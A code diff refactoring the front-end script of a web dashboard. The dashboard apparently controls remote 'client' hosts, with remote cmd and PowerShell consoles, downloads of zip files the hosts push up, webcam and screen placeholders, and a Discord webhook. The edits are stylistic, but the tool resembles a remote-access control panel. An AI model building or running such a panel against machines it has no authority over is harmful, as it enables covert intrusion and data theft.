@@ -20,10 +20,10 @@ async function loadMe() {
   $('whurl').value = u.discordWebhook || '';
 }
 
-document.querySelectorAll('.nav a').forEach(a => {
-  a.onclick = () => {
-    document.querySelectorAll('.nav a').forEach(x => x.classList.remove('active'));
-    document.querySelectorAll('.section').forEach(x => x.classList.remove('active'));
+document.querySelectorAll('.nav a').forEach((a) => {
+  a.addEventListener('click', () => {
+    document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
+    document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
     a.classList.add('active');
     $(a.dataset.tab).classList.add('active');
 
@@ -32,12 +32,10 @@ document.querySelectorAll('.nav a').forEach(a => {
     else if (tab === 'hosts') { loadHosts(); startPolling(); }
     else if (tab === 'remote') { loadRemote(); startPolling(); }
     else stopPolling();
-  };
+  });
 });
 
-function stopPolling() {
-  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-}
+function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
 function startPolling() {
   stopPolling();
   pollTimer = setInterval(() => {
@@ -51,19 +49,17 @@ function startPolling() {
 async function fetchClients() {
   const r = await fetch('/api/clients');
   if (!r.ok) return [];
-  return await r.json();
+  return r.json();
 }
 
-// ---- overview ----
 async function loadOverview() {
   const list = await fetchClients();
-  const online = list.filter(c => c.online).length;
+  const online = list.filter((c) => c.online).length;
   $('ov-online').textContent = online;
   $('ov-offline').textContent = list.length - online;
   $('ov-total').textContent = list.length;
 }
 
-// ---- hosts ----
 async function loadHosts() {
   const list = await fetchClients();
   const grid = $('h-grid');
@@ -72,7 +68,7 @@ async function loadHosts() {
     grid.innerHTML = '<div class="note">no hosts yet.</div>';
     return;
   }
-  list.forEach(c => {
+  list.forEach((c) => {
     const el = document.createElement('div');
     el.className = 'tile';
     el.style.cursor = 'pointer';
@@ -81,14 +77,13 @@ async function loadHosts() {
       <div class="v">${escapeHtml(c.hostname)}</div>
       <div class="k" style="margin-top:8px">${escapeHtml(c.ip)}</div>
       <div class="k" style="margin-top:8px">last seen ${timeAgo(c.lastSeen)}</div>`;
-    el.onclick = () => openHostDetail(c);
+    el.addEventListener('click', () => openHostDetail(c));
     grid.appendChild(el);
   });
 }
 
 async function openHostDetail(c) {
-  const existing = document.getElementById('h-detail');
-  if (existing) existing.remove();
+  document.getElementById('h-detail')?.remove();
 
   const box = document.createElement('div');
   box.id = 'h-detail';
@@ -99,30 +94,27 @@ async function openHostDetail(c) {
     <div class="brand"><span class="w">host</span><span class="h">detail</span></div>
     <h1>${escapeHtml(c.hostname)}</h1>
     <div class="sub">${escapeHtml(c.ip)}</div>
-
     <div class="tiles" style="grid-template-columns:1fr 1fr">
       <div class="tile"><div class="k">client id</div><div class="v mono">${c.id}</div></div>
       <div class="tile"><div class="k">state</div><div class="v" style="color:${c.online ? 'var(--green-2)' : 'var(--orange-2)'}">${c.online ? 'online' : 'offline'}</div></div>
       <div class="tile"><div class="k">ipv4</div><div class="v mono">${escapeHtml(c.ip)}</div></div>
       <div class="tile"><div class="k">last seen</div><div class="v">${new Date(c.lastSeen).toLocaleString()}</div></div>
     </div>
-
     <div style="display:flex;gap:8px;margin-top:18px;flex-wrap:wrap">
-      <button class="ghost" id="hd-console-cmd" style="margin-top:0">open cmd</button>
-      <button class="ghost" id="hd-console-ps"  style="margin-top:0">open powershell</button>
+      <button class="ghost" id="hd-cmd" style="margin-top:0">open cmd</button>
+      <button class="ghost" id="hd-ps"  style="margin-top:0">open powershell</button>
       <button class="ghost" id="hd-close" style="margin-top:0">close</button>
     </div>
-
     <h2 style="margin-top:28px">uploads</h2>
     <div class="sub">zip files this host has pushed.</div>
     <div id="hd-uploads" style="display:flex;flex-direction:column;gap:8px"></div>
-    <div class="err" id="hd-err"></div>
-  `;
+    <div class="err" id="hd-err"></div>`;
+
   document.getElementById('hosts').appendChild(box);
 
-  box.querySelector('#hd-console-cmd').onclick = () => popConsole(c, 'cmd');
-  box.querySelector('#hd-console-ps').onclick  = () => popConsole(c, 'powershell');
-  box.querySelector('#hd-close').onclick      = () => box.remove();
+  box.querySelector('#hd-cmd').addEventListener('click', () => popConsole(c, 'cmd'));
+  box.querySelector('#hd-ps').addEventListener('click', () => popConsole(c, 'powershell'));
+  box.querySelector('#hd-close').addEventListener('click', () => box.remove());
 
   await loadUploads(c.id, box.querySelector('#hd-uploads'), box.querySelector('#hd-err'));
 }
@@ -137,7 +129,7 @@ async function loadUploads(clientId, container, errEl) {
     container.innerHTML = '<div class="note">no uploads yet. the client can push zips to /api/client/upload.</div>';
     return;
   }
-  rows.forEach(u => {
+  rows.forEach((u) => {
     const el = document.createElement('div');
     el.className = 'tile';
     el.style.display = 'flex';
@@ -149,17 +141,16 @@ async function loadUploads(clientId, container, errEl) {
         <div class="v">${escapeHtml(u.filename)}</div>
         <div class="k" style="margin-top:6px">${humanSize(u.size)}</div>
       </div>
-      <button class="orange" data-dl="${u.id}" style="width:auto;margin:0;padding:10px 18px">download</button>`;
-    el.querySelector('[data-dl]').onclick = () => {
+      <button class="orange" style="width:auto;margin:0;padding:10px 18px">download</button>`;
+    el.querySelector('button').addEventListener('click', () => {
       window.location.href = `/api/uploads/${u.id}/download`;
-    };
+    });
     container.appendChild(el);
   });
 }
 
-// ---- remote ----
 async function loadRemote() {
-  const list = (await fetchClients()).filter(c => c.online);
+  const list = (await fetchClients()).filter((c) => c.online);
   const box = $('r-remote-list');
   box.innerHTML = '';
   if (list.length === 0) {
@@ -167,7 +158,7 @@ async function loadRemote() {
     $('r-actions').style.display = 'none';
     return;
   }
-  list.forEach(c => {
+  list.forEach((c) => {
     const el = document.createElement('div');
     el.className = 'tile';
     el.style.cursor = 'pointer';
@@ -181,7 +172,7 @@ async function loadRemote() {
         <div class="k" style="margin-top:6px">${escapeHtml(c.ip)}</div>
       </div>
       <div class="note" style="margin:0">click to select</div>`;
-    el.onclick = () => selectRemote(c);
+    el.addEventListener('click', () => selectRemote(c));
     box.appendChild(el);
   });
 }
@@ -193,15 +184,13 @@ function selectRemote(c) {
   $('r-err').textContent = '';
 }
 
-document.querySelectorAll('#r-actions [data-act]').forEach(btn => {
-  btn.onclick = () => {
+document.querySelectorAll('#r-actions [data-act]').forEach((btn) => {
+  btn.addEventListener('click', () => {
     if (!currentClient) { $('r-err').textContent = 'select a client first'; return; }
     const act = btn.dataset.act;
     if (act === 'cmd' || act === 'powershell') popConsole(currentClient, act);
-    else if (act === 'webcam' || act === 'screen') {
-      $('r-err').textContent = `${act} is not backed by the client yet.`;
-    }
-  };
+    else $('r-err').textContent = `${act} is not backed by the client yet.`;
+  });
 });
 
 function popConsole(c, shell) {
@@ -209,12 +198,11 @@ function popConsole(c, shell) {
     id: String(c.id),
     shell,
     host: c.hostname || '',
-    ip: c.ip || ''
+    ip: c.ip || '',
   });
   window.open('/cmd.html?' + q.toString(), '_blank', 'width=900,height=560');
 }
 
-// ---- account key reveal ----
 document.addEventListener('click', (e) => {
   if (e.target && e.target.id === 'key-toggle') {
     const el = $('key2');
@@ -246,28 +234,27 @@ function humanSize(n) {
 }
 
 function escapeHtml(s) {
-  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
-    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
   }[c]));
 }
 
-// ---- settings ----
-$('whtest').onclick = async () => {
+$('whtest').addEventListener('click', async () => {
   $('wherr').textContent = '';
   const r = await fetch('/api/webhook/test', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ url: $('whurl').value.trim() })
+    body: JSON.stringify({ url: $('whurl').value.trim() }),
   });
   const d = await r.json().catch(() => ({}));
   $('wherr').textContent = r.ok ? 'webhook live' : (d.error || 'failed');
   if (r.ok) $('wh').textContent = 'connected';
-};
+});
 
-$('logout').onclick = async () => {
+$('logout').addEventListener('click', async () => {
   await fetch('/api/logout', { method: 'POST' });
   location.href = '/signin.html';
-};
+});
 
 loadMe();
 loadOverview();
